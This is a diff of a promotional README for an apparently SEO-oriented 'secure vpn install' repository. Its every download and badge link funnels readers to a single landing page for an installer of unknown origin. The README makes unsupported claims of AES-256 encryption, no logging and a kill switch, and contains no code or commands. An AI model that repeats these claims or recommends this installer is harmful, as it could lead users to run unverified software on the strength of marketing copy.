@@ -1,98 +1,94 @@
 # ⚡ secure vpn install
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=download)](https://gonbon808.github.io/secure-vpn-install-landing/)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-1f6feb?style=for-the-badge&logo=windows)
-![License](https://img.shields.io/badge/License-MIT-8b949e?style=for-the-badge&logo=github)
+[![Download](https://img.shields.io/badge/Download-Get%20Installer-blue?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-install-landing/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-2ea44f?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-install-landing/)
+[![License](https://img.shields.io/badge/License-MIT-black?style=for-the-badge)](https://github.com/gonbon808/secure-vpn-install-seo)
 
 ## About
 
-This repo documents a clean **secure vpn install** flow and the exact checks you should do before and after you connect. The goal: get a VPN running fast, confirm it’s actually protecting traffic, and keep it stable.
+**secure vpn install** is the fast path to getting a privacy-first VPN running on your machine with minimal friction. The goal here is simple: install, connect, and keep your traffic protected with **AES-256 encryption**, a **No-Logs policy**, and a **Kill Switch** that actually does its job when the network drops.
 
-Project repo: https://github.com/gonbon808/secure-vpn-install-seo  
-Main page (all buttons link here): https://gonbon808.github.io/secure-vpn-install-landing/
+Repo: https://github.com/gonbon808/secure-vpn-install-seo  
+Landing page / installer: https://gonbon808.github.io/secure-vpn-install-landing/
 
 ## Features
 
-- **AES-256 encryption** for traffic protection
-- **No-Logs policy** focus (privacy first)
-- **Kill Switch** to cut traffic if the tunnel drops
-- **Global Servers** to pick the closest or the region you need
-- **High speed** with low overhead on modern hardware
-- **Stable connection** under sleep/wake and network changes
-- Clear install steps + quick verification checklist after install
+- **AES-256 encryption** for encrypted tunnels you can trust
+- **No-Logs policy** focus (no activity logging by design intent)
+- **Kill Switch** to cut traffic if the VPN disconnects
+- **Global Servers** for flexible routing and region switching
+- **High speed** profiles for day-to-day browsing and streaming
+- **Stable connection** tuning (reconnect behavior and DNS handling)
+- Clean install flow with minimal prompts and sane defaults
 
 ## System Requirements
 
-| Item | Minimum | Notes |
-|---|---:|---|
-| Windows | Windows 10/11 | Admin rights required for driver/network changes |
-| macOS | macOS 12+ | Allow VPN permissions when prompted |
-| Linux | Ubuntu 20.04+ (or equivalent) | Works best with NetworkManager installed |
-| RAM | 2 GB+ | 4 GB recommended if you run heavy browsers |
-| Storage | 200 MB+ | Leaves room for updates/log buffers |
-| Internet | Any broadband | Stable Wi‑Fi or Ethernet recommended |
+| Item | Requirement |
+|---|---|
+| Windows | Windows 10/11 (64-bit) |
+| macOS | macOS 12+ |
+| Linux | Ubuntu 20.04+/Debian-based or equivalent (64-bit) |
+| RAM | 2 GB minimum (4 GB recommended) |
+| Storage | 200 MB free |
+| Internet | Broadband connection required |
 
 ## Installation
 
-All installers and entry points are linked from the same landing page:
-
-- https://gonbon808.github.io/secure-vpn-install-landing/
+All installs start from the same landing page:  
+**https://gonbon808.github.io/secure-vpn-install-landing/**
 
 ### Windows
-
-1. Open the download page: https://gonbon808.github.io/secure-vpn-install-landing/
-2. Run the installer as Administrator.
-3. Accept the network adapter/driver prompts.
-4. Launch the app → sign in → pick a server → connect.
-5. Turn on **Kill Switch** in Settings before daily use.
+1. Open the installer page: https://gonbon808.github.io/secure-vpn-install-landing/
+2. Download the Windows installer.
+3. Run the installer (`.exe`) → allow permissions when prompted.
+4. Launch the app → sign in / create profile → **Connect**.
 
 ### macOS
-
-1. Open the download page: https://gonbon808.github.io/secure-vpn-install-landing/
-2. Install the app (drag to Applications if provided as a DMG).
-3. Open it once and approve the VPN configuration prompt.
-4. Connect to a nearby server first (baseline speed), then switch regions as needed.
-5. Enable **Kill Switch** (or “Always-on” if available) in Settings.
+1. Open the installer page: https://gonbon808.github.io/secure-vpn-install-landing/
+2. Download the macOS package.
+3. Open the installer → approve the system extension/VPN permission when macOS asks.
+4. Launch the app → **Connect** → confirm the VPN configuration prompt.
 
 ### Linux
-
-1. Open the download page: https://gonbon808.github.io/secure-vpn-install-landing/
-2. Follow the Linux package instructions shown there (DEB/RPM/AppImage depending on distro).
-3. If using NetworkManager, import/enable the VPN profile when prompted.
-4. Connect and confirm your new IP in the app status panel.
-5. Enable **Kill Switch** to prevent leaks on network drops.
+1. Open the installer page: https://gonbon808.github.io/secure-vpn-install-landing/
+2. Download the Linux package for your distro.
+3. Install using your package manager (or run the provided installer script).
+4. Start the client and connect:
+   - Use the app UI if provided, or the included CLI to log in and connect.
 
 ## Comparison
 
-| Provider | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
+| Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
 |---|---:|:---:|:---:|:---:|:---:|
-| This secure vpn install | High speed | ✅ | ✅ | ✅ | ✅ |
-| Typical free VPN | Low / throttled | ⚠️ | ❌ | ⚠️ | ⚠️ |
-| Basic proxy | Medium | ❌ | ❌ | ❌ | ⚠️ |
+| Secure VPN (this install) | High speed | ✅ | ✅ | ✅ | ✅ |
+| Typical free VPN | Low–Medium | ⚠️ | ❌/⚠️ | ❌ | ⚠️ |
+| Manual VPN config (DIY) | Medium–High | ✅ | ✅ | ⚠️ | ⚠️ |
 
 ## FAQ
 
-**Q: Does this secure vpn install change my whole device traffic or just the browser?**  
-A: It routes device traffic through the VPN tunnel (system-level), not just a single app.
+**1) Does secure vpn install include a Kill Switch?**  
+Yes. Enable **Kill Switch** in settings to block traffic if the VPN drops.
 
-**Q: How do I confirm the VPN is actually connected?**  
-A: Check the app status (connected + server), then confirm your external IP changes after connecting.
+**2) What encryption does it use?**  
+**AES-256 encryption**.
 
-**Q: What does Kill Switch do?**  
-A: If the VPN drops, Kill Switch blocks network traffic so you don’t leak your real IP mid-session.
+**3) Will it slow down my connection?**  
+Any VPN adds overhead, but the service is tuned for **high speed** with a **stable connection** on nearby **Global Servers**.
 
-**Q: Will this slow down my connection?**  
-A: Some overhead is normal, but you should still get **high speed** on nearby **global servers** with a stable line.
+**4) Is it No-Logs?**  
+The project is built around a **No-Logs policy** approach—traffic activity isn’t intended to be stored as usage history.
 
 ## Download
 
-Get the installer and start the secure vpn install here:  
+Get the installer here (official landing page):  
 **https://gonbon808.github.io/secure-vpn-install-landing/**
+
+[**Download secure vpn install**](https://gonbon808.github.io/secure-vpn-install-landing/)
 
 ## Final CTA
 
-[![Install Now](https://img.shields.io/badge/Install-Now-2ea44f?style=for-the-badge&logo=rocket)](https://gonbon808.github.io/secure-vpn-install-landing/)
-[![Open Landing Page](https://img.shields.io/badge/Open-Landing%20Page-1f6feb?style=for-the-badge&logo=githubpages)](https://gonbon808.github.io/secure-vpn-install-landing/)
-[![Get Started](https://img.shields.io/badge/Get-Started-ff7a18?style=for-the-badge&logo=readme)](https://gonbon808.github.io/secure-vpn-install-landing/)
+[![Install Now](https://img.shields.io/badge/Install-Open%20Landing%20Page-blue?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-install-landing/)
+[![Get Installer](https://img.shields.io/badge/Get-Download-green?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-install-landing/)
+[![Connect Securely](https://img.shields.io/badge/Connect-Secure%20VPN-black?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-install-landing/)
 
-*Keep your connection private, keep the tunnel up, and don’t browse without the Kill Switch enabled.*
+*Privacy is a setting—flip it on and keep it on.*
